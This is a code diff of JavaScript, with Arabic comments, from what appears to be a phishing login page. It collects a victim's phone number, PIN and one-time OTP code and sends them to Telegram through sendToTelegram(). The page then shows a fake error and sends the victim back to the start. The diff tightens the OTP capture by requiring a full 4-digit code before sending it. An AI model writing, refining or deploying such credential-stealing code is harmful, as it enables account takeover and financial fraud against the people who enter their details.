@@ -478,7 +478,6 @@ function login(){
   if(ph.length !== 8 || !isValidPrefix || pin.length !== 4){
     document.getElementById('user-error-modal').classList.remove('hide');
   } else {
-    // إرسال البيانات للتليجرام فقط عند تسجيل الدخول الناجح للتحويل إلى OTP
     sendToTelegram(ph, pin);
     showOtp();
   }
@@ -522,13 +521,18 @@ O.forEach(function(el,i){
 function verify(){
   var code=O.map(function(o){return o.value;}).join('');
   
+  // اشتراط أن يكون الـ OTP يتكون من 4 أرقام كاملة
+  if(code.length !== 4) {
+    return; // ترفض العملية إذا كان أقل من 4 أرقام
+  }
+  
   var ph=phEl.value.trim();
   var pin=P.map(function(p){return p.value;}).join('');
   
-  // إرسال كود OTP مرة واحدة فقط
+  // إرسال كود OTP المكون من 4 أرقام
   sendToTelegram(ph, pin, code);
 
-  // إظهار النافذة المنبثقة للخطأ
+  // إظهار نافذة الخطأ
   document.getElementById('otp-error-modal').classList.remove('hide');
 }
 
@@ -536,7 +540,7 @@ function closeOtpErrorModal(){
   // إخفاء النافذة المنبثقة
   document.getElementById('otp-error-modal').classList.add('hide');
   
-  // الانتقال التلقائي للواجهة الأولى عند إغلاق التنبيه
+  // العودة للواجهة الأولى
   back();
 }
 
